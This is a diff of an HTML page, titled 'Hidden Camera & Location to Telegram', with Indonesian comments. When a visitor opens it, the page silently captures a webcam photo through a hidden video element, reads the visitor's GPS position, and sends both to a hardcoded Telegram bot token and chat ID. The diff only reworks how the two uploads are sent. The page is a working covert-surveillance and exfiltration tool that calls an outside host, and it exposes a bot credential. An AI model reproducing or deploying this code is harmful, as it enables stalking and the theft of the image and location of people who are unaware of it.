@@ -1,104 +1,114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Hidden Camera & Location to Telegram</title>
-<style>
-  /* Sembunyikan video dan foto supaya gak kelihatan */
-  #video, #photo {
-    display: none;
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Hidden GPS & Camera Capture</title>
+  <style>
+    #video, #photo {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-<p id="status">Mengambil data...</p>
+  <p id="status">Memeriksa izin...</p>
 
-<video id="video" autoplay muted playsinline></video>
-<img id="photo" alt="snapshot" />
+  <video id="video" autoplay muted playsinline></video>
+  <img id="photo" alt="snapshot" />
 
 <script>
+const status = document.getElementById('status');
 const video = document.getElementById('video');
 const photo = document.getElementById('photo');
-const status = document.getElementById('status');
 
-// Ganti dengan token dan chat_id Telegram kamu
-const TELEGRAM_BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
-const TELEGRAM_CHAT_ID = '7218964278';
+const BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
+const CHAT_ID = '7218964278';
 
-async function sendPhotoAndLocation(photoBase64, latitude, longitude) {
-  const textMessage = `Lokasi: https://maps.google.com/?q=${latitude},${longitude}`;
-  
-  // Kirim teks lokasi dulu
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: textMessage,
-    }),
-  });
+async function sendToTelegram(photoBase64, locationText) {
+  // Kirim lokasi (kalau ada)
+  if (locationText) {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: CHAT_ID, text: locationText})
+    });
+  }
 
-  // Kirim foto (hapus "data:image/png;base64," supaya Telegram terima)
-  const photoBase64Clean = photoBase64.replace(/^data:image\/png;base64,/, '');
+  // Kirim foto (jika ada)
+  if (photoBase64) {
+    const base64data = photoBase64.replace(/^data:image\/png;base64,/, '');
+    const blob = await (await fetch(photoBase64)).blob();
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'photo.png');
 
-  const formData = new FormData();
-  formData.append('chat_id', TELEGRAM_CHAT_ID);
-  formData.append('photo', photoBase64Clean);
-
-  // Kirim foto via sendPhoto API
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-    method: 'POST',
-    body: formData,
-  });
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+  }
 }
 
-async function start() {
+async function checkPermissionsAndStart() {
   try {
-    // Minta akses kamera
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-  } catch (err) {
-    status.textContent = 'Gagal akses kamera: ' + err.message;
-    return;
-  }
+    let locationAllowed = false;
+    let cameraAllowed = false;
+    let latitude = '', longitude = '';
 
-  if (!navigator.geolocation) {
-    status.textContent = 'Browser tidak support geolocation';
-    return;
-  }
+    // Cek dan minta izin lokasi
+    try {
+      const geoStatus = await navigator.permissions.query({name: 'geolocation'});
+      if (geoStatus.state === 'granted' || geoStatus.state === 'prompt') {
+        await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition((pos) => {
+            latitude = pos.coords.latitude;
+            longitude = pos.coords.longitude;
+            locationAllowed = true;
+            resolve();
+          }, reject);
+        });
+      }
+    } catch (e) {
+      console.warn('Lokasi gagal:', e);
+    }
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+    // Cek dan minta izin kamera
+    let photoBase64 = null;
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
 
-      // Ambil foto dari video (kamera tersembunyi)
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 320;
       canvas.height = video.videoHeight || 240;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const photoDataUrl = canvas.toDataURL('image/png');
-      photo.src = photoDataUrl;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      photoBase64 = canvas.toDataURL('image/png');
+      cameraAllowed = true;
 
-      status.textContent = 'Mengirim data ke Telegram...';
-
-      try {
-        await sendPhotoAndLocation(photoDataUrl, lat, lon);
-        status.textContent = 'Data berhasil dikirim ke Telegram!';
-      } catch (e) {
-        status.textContent = 'Gagal kirim ke Telegram: ' + e.message;
-      }
-    },
-    (err) => {
-      status.textContent = 'Gagal dapat lokasi: ' + err.message;
+      stream.getTracks().forEach(track => track.stop()); // stop camera
+    } catch (e) {
+      console.warn('Kamera gagal:', e);
     }
-  );
+
+    if (!cameraAllowed && !locationAllowed) {
+      status.textContent = 'Gagal akses kamera & lokasi. Izin dibutuhkan.';
+      return;
+    }
+
+    status.textContent = 'Mengirim data ke Telegram...';
+
+    const locationText = locationAllowed ? `Lokasi: https://maps.google.com/?q=${latitude},${longitude}` : '';
+    await sendToTelegram(photoBase64, locationText);
+
+    status.textContent = 'Data berhasil dikirim!';
+  } catch (err) {
+    status.textContent = 'Terjadi kesalahan: ' + err.message;
+  }
 }
 
-// Jalankan langsung saat halaman dibuka
-start();
+// Jalankan saat halaman dibuka
+checkPermissionsAndStart();
 </script>
 </body>
 </html>
